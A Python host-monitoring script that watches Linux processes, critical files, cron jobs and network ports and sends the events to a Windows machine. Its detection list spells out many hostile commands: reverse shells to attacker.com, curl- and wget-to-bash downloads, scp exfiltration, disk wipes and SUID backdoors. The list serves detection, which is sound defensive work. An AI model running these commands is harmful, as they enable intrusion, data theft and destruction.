import os
import time
import json
import socket
from datetime import datetime
from queue import Queue
import subprocess
import psutil
import threading
from scapy.all import sniff, IP, TCP, conf
import glob
import hashlib
import re

# Embedded Configuration for Script 1
WINDOWS_IP = "192.168.154.133"  # Windows machine IP
PORT_LOGS = 5400  # Port for sending logs and security events

# Embedded Configuration for Script 2
WINDOWS_HOST = "192.168.154.133"  # Replace with the Windows machine's IP address
WINDOWS_PORT = 5050  # Port where Windows listens for process data

# High-Risk Commands for Script 1
HIGH_RISK_COMMANDS = [
    "rm -rf", "chmod 777", "wget", "curl", "nc",  
"ncat", "ssh", "scp", "sudo", "passwd",  
"whoami", "id", "uname -a", "hostname", "ifconfig",  
"ip a", "netstat", "ss", "ps aux", "lsof",  
"cat /etc/passwd", "cat /etc/shadow", "find / -perm -4000",  
"tar czf", "scp", "rsync", "nc -e", "bash -i",  
"python3 -c", "perl -e", "echo '*/5 * * * *'",  
"systemctl enable", "shred -u", "history -c", "journalctl --vacuum-time=1s",  
"dd if=/dev/mem", "openssl enc", "mkfifo", "rm -- \"$0\"",  
"crontab -l", "chattr -i", "ln -s", "useradd", "usermod",  
"iptables -F", "tcpdump", "strace", "ltrace", "scp -r",  
"dd if=/dev/sda", "gpg --decrypt", "nc -lvnp", "base64 -d",  
"echo 'bash -i >& /dev/tcp/'", "nohup", "nohup ./malware",  
"export HISTFILE=/dev/null", "unset HISTFILE", "kill -9",  
"pkill -f", "nohup rm -rf /", "dd if=/dev/zero",  
"mv /bin/bash /tmp/bash_hidden", "cp /bin/bash /tmp/shell && chmod +s /tmp/shell",  
"find / -type f -name '*.key'", "find / -type f -name '*.pem'",  
"iptables -A INPUT -p tcp --dport 22 -j DROP",  
"iptables -A OUTPUT -p tcp --dport 80 -j DROP",  
"iptables -P FORWARD DROP", "chmod u+s /bin/bash",  
"echo 'echo PWNED' > /usr/local/bin/malicious && chmod +x /usr/local/bin/malicious",  
"iptables-save", "iptables-restore", "nc -w",  
"tee /proc/sys/kernel/core_pattern", "dmesg | tail",  
"wget -qO- http://malicious.com/payload.sh | bash",  
"curl -fsSL http://malicious.com/install.sh | sh",  
"cat /dev/random > /dev/null", "strings /bin/bash",  
"openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes",  
"openssl s_client -connect attacker.com:443",  
"iptables -A INPUT -p tcp --dport 4444 -j ACCEPT",  
"nc -e /bin/sh attacker.com 4444", "scp -P 2222 file user@192.168.1.5:/tmp/",  
"echo 1 > /proc/sys/kernel/sysrq", "echo b > /proc/sysrq-trigger",  
"mv ~/.bashrc ~/.bashrc.bak", "cp /etc/hosts /tmp/.hidden_hosts",  
"dd if=/dev/random of=/dev/sda", "shred -n 35 -vz /dev/sda",  
"bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'",  
"wget http://attacker.com/malware -O /tmp/malware && chmod +x /tmp/malware && /tmp/malware",  
"echo 'root::0:0:root:/root:/bin/bash' >> /etc/passwd",  
"echo 'root:password' | chpasswd", "ln -s /dev/null ~/.bash_history",  
"mv /var/log /var/.log_backup", "rm -rf ~/.ssh",  
"cat /var/log/auth.log | grep 'Accepted password'",  
"awk -F: '{print $1}' /etc/passwd", "du -ah / | grep 'password'",  
"journalctl --no-pager | grep 'authentication failure'",  
"find / -name '*.db' -exec sqlite3 {} '.dump' \;",  
"rsync -avz /root attacker@192.168.1.100:/backup/",  
"scp -r /etc attacker@192.168.1.100:/loot/",  
"echo 0 > /proc/sys/kernel/randomize_va_space",  
"echo performance | tee /sys/devices/system/cpu/cpu*/cpufreq/scaling_governor",  
"dd if=/dev/urandom of=/dev/sda bs=4M", "cat ~/.bash_history",  
"iptables -A OUTPUT -p tcp --dport 443 -j DROP",  
"cat /etc/resolv.conf", "systemctl stop firewalld",  
"systemctl stop ufw", "echo 'malicious script' > /dev/tcp/attacker.com/80",  
"cp /bin/sh /tmp/.backdoor && chmod +s /tmp/.backdoor",  
"iptables -I INPUT -s 192.168.1.100 -j ACCEPT",  
"iptables -A INPUT -p tcp --dport 80 -j DROP",  
"ufw disable", "firewall-cmd --permanent --zone=public --add-port=4444/tcp",  
"ip rule add from 192.168.1.100 table 1", "ip route add default via 192.168.1.1 table 1",  
"nohup nc -lvp 4444 -e /bin/bash &", "echo 1 > /proc/sys/net/ipv4/ip_forward",  
"sh -c 'nc -e /bin/bash attacker.com 4444'",  
"bash -c 'exec bash -i &>/dev/tcp/attacker.com/4444 0>&1'",  
"echo 'echo backdoor' > /etc/rc.local",  
"cp /etc/shadow /tmp/shadow_backup && chmod 777 /tmp/shadow_backup",  
"iptables -D INPUT -p tcp --dport 22 -j ACCEPT",  
"iptables -I INPUT -p tcp --dport 4444 -j ACCEPT",  
"ssh -o StrictHostKeyChecking=no -i ~/.ssh/id_rsa user@attacker.com",  
"echo '*/1 * * * * root bash /tmp/malicious.sh' >> /etc/crontab",  
"chmod 000 /etc/passwd", "echo 0 > /proc/sys/net/ipv4/tcp_syncookies",  
"dd if=/dev/zero of=/dev/sda bs=1M count=500",  
"cp /bin/bash /tmp/bash_backdoor && chmod u+s /tmp/bash_backdoor"]

# Critical Files to Monitor for Script 1
CRITICAL_FILES = [
    "/etc/passwd", "/etc/shadow", "/etc/sudoers",
    "/etc/hosts", "/etc/crontab"
]

# Cron Files to Monitor for Script 1
CRON_FILES = [
    "/var/spool/cron/crontabs/root",  # User-specific cron jobs
    "/etc/crontab",  # System-wide cron jobs
    "/etc/cron.d/*",  # Additional cron job files
    "/var/spool/cron/crontabs/*"  # All user-specific cron jobs
]

# Suspicious Ports for Script 1
SUSPICIOUS_PORTS = [22, 23, 80, 443, 8080]

# State Tracking for Script 1
last_file_mod_times = {file: os.path.getmtime(file) if os.path.exists(file) else 0 for file in CRITICAL_FILES}
last_cron_jobs = {}
last_network_events = set()
last_commands_sent = set()  # Track commands that have already been sent
event_queue = Queue()  # Queue to store events for sending

# Set Scapy to use the correct network interface for Script 1
active_interface = "ens33"  # Replace with your active interface (e.g., ens33)
conf.iface = active_interface

# Function to monitor running processes for suspicious commands (Script 1)
def monitor_processes():
    """Monitor running processes for high-risk commands."""
    while True:
        for proc in psutil.process_iter(['pid', 'name', 'cmdline', 'username']):
            try:
                info = proc.info
                cmdline = " ".join(info['cmdline']) if info['cmdline'] else ""
                for risky_cmd in HIGH_RISK_COMMANDS:
                    if risky_cmd in cmdline:
                        command_hash = hash(cmdline)
                        if command_hash not in last_commands_sent:
                            event_queue.put({
                                "type": "suspicious_command",
                                "timestamp": datetime.now().isoformat(),
                                "user": info['username'],
                                "command": cmdline,
                                "pid": info['pid']
                            })
                            last_commands_sent.add(command_hash)
                            print(f"Detected suspicious process: {cmdline}")  # Debugging
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                continue
        time.sleep(5)  # Check for new processes every 5 seconds

# Function to monitor file access and modifications (Script 1)
def monitor_file_access():
    """Monitor critical files for modifications."""
    file_events = []
    for critical_file in CRITICAL_FILES:
        if os.path.exists(critical_file):
            current_mod_time = os.path.getmtime(critical_file)
            last_mod_time = last_file_mod_times.get(critical_file, 0)

            if current_mod_time > last_mod_time:
                file_events.append({
                    "type": "file_event",
                    "timestamp": datetime.now().isoformat(),
                    "file": critical_file,
                    "last_modified": datetime.fromtimestamp(current_mod_time).isoformat()
                })
                last_file_mod_times[critical_file] = current_mod_time
    return file_events

# Function to monitor cron jobs (Script 1)
def monitor_cron_jobs():
    """Monitor cron jobs for suspicious activities."""
    cron_events = []
    for cron_pattern in CRON_FILES:
        for cron_file in glob.glob(cron_pattern):
            try:
                with open(cron_file, 'r') as f:
                    current_jobs = [line.strip() for line in f if not line.startswith("#")]
                    last_jobs = last_cron_jobs.get(cron_file, [])

                    new_jobs = list(set(current_jobs) - set(last_jobs))
                    if new_jobs:
                        for job in new_jobs:
                            cron_events.append({
                                "type": "cron_event",
                                "timestamp": datetime.now().isoformat(),
                                "cron_file": cron_file,
                                "job": job
                            })
                        last_cron_jobs[cron_file] = current_jobs
            except Exception as e:
                print(f"Error reading cron file {cron_file}: {e}")
    return cron_events

# Function to monitor network traffic (Script 1)
def monitor_network_traffic():
    """Monitor network traffic for suspicious ports."""
    global last_network_events
    network_events = []

    def packet_callback(packet):
        if IP in packet and TCP in packet:
            src_port = packet[TCP].sport
            dst_port = packet[TCP].dport
            if src_port in SUSPICIOUS_PORTS or dst_port in SUSPICIOUS_PORTS:
                event_key = (packet[IP].src, packet[IP].dst, src_port, dst_port)
                if event_key not in last_network_events:
                    network_events.append({
                        "type": "network_event",
                        "timestamp": datetime.now().isoformat(),
                        "src_ip": packet[IP].src,
                        "dst_ip": packet[IP].dst,
                        "src_port": src_port,
                        "dst_port": dst_port,
                        "flags": str(packet[TCP].flags)
                    })
                    last_network_events.add(event_key)

    sniff(prn=packet_callback, store=0, timeout=5)  # Sniff for 5 seconds
    return network_events

# Function to send data to Windows in NDJSON format (Script 1)
def send_data_to_windows(data, port):
    """Send data to the Windows machine using a TCP socket in NDJSON format."""
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((WINDOWS_IP, port))
            for entry in data:
                ndjson_entry = json.dumps(entry) + "\n"  # Convert to NDJSON format
                s.sendall(ndjson_entry.encode('utf-8'))
            print(f"Data sent to {WINDOWS_IP}:{port}")  # Debugging
    except Exception as e:
        print(f"Error sending data: {e}")

# Function to hash process names (Script 2)
def hash_process_name(process_name):
    """Hashes process names for AI model training to prevent sensitive info exposure."""
    return hashlib.sha256(process_name.encode()).hexdigest()

# Function to get process data (Script 2)
def get_process_data():
    """Fetches system process details using the top command."""
    try:
        result = subprocess.run(
            ["top", "-b", "-n", "1", "-o", "%CPU"],
            stdout=subprocess.PIPE, text=True, stderr=subprocess.PIPE
        )
        
        if result.returncode != 0:
            print(f"Error running top command: {result.stderr}")
            return []

        lines = result.stdout.split("\n")
        process_data = []
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        # Find the header line (look for lines containing "PID")
        header_index = -1
        for i, line in enumerate(lines):
            if "PID" in line and "USER" in line and "%CPU" in line:
                header_index = i
                break

        if header_index == -1:
            print("Header line not found in top output")
            return []

        # Process each subsequent line
        for line in lines[header_index + 1:]:
            if not line.strip():  # Skip empty lines
                continue

            # Split the line into parts using regex to handle variable spaces
            parts = re.split(r"\s+", line.strip(), maxsplit=11)
            if len(parts) < 12:
                print(f"Skipping malformed line: {line}")
                continue  # Skip malformed lines

            # Extract relevant columns
            pid, user, pr, ni, virt, res, shr, s, cpu, mem, time_used, command = parts[:12]
            
            # Append process data to the list
            process_data.append([
                timestamp, pid, user, cpu, mem, virt, res, shr, s, time_used, command,
                hash_process_name(command)  # Hash for AI training
            ])

        return process_data

    except Exception as e:
        print(f"Error fetching process data: {e}")
        return []

# Function to send CSV data to Windows (Script 2)
def send_csv_to_windows(process_data):
    """Sends process data as CSV rows to the Windows machine."""
    try:
        # Convert process data to CSV rows (without header)
        csv_rows = []
        for row in process_data:
            csv_rows.append(",".join(map(str, row)))

        # Send CSV rows over the network
        with socket.create_connection((WINDOWS_HOST, WINDOWS_PORT)) as s:
            for row in csv_rows:
                s.sendall(row.encode() + b"\n")  # Send row-by-row
            print("CSV data sent to Windows successfully.")

    except Exception as e:
        print(f"Error sending CSV data to Windows: {e}")

# Main function for Script 1
def collect_and_send_data():
    """Collect and send all monitoring data in real-time."""
    # Start the process monitor in a separate thread
    process_thread = threading.Thread(target=monitor_processes)
    process_thread.daemon = True
    process_thread.start()

    while True:
        # Collect real-time suspicious commands
        suspicious_commands = []
        while not event_queue.empty():
            suspicious_commands.append(event_queue.get())

        # Collect file access events
        file_events = monitor_file_access()

        # Collect cron events
        cron_events = monitor_cron_jobs()

        # Collect network events
        network_events = monitor_network_traffic()

        # Combine all new data
        combined_data = suspicious_commands + file_events + cron_events + network_events

        # Send data to Windows only if there is new data
        if combined_data:
            print(f"Sending data: {combined_data}")  # Debugging
            send_data_to_windows(combined_data, PORT_LOGS)

        time.sleep(10)  # Check for new data every 10 seconds

# Main function for Script 2
def monitor_and_send_process_data():
    """Main monitoring loop: collects process data and sends it every 30 seconds."""
    while True:
        process_data = get_process_data()
        if process_data:
            print("Process data fetched successfully:")
            for row in process_data:
                print(row)
            send_csv_to_windows(process_data)
        time.sleep(30)  # Wait for 30 seconds before next collection

if __name__ == "__main__":
    # Start both monitoring functions in separate threads
    threading.Thread(target=collect_and_send_data, daemon=True).start()
    threading.Thread(target=monitor_and_send_process_data, daemon=True).start()

    # Keep the main thread alive
    while True:
        time.sleep(1)
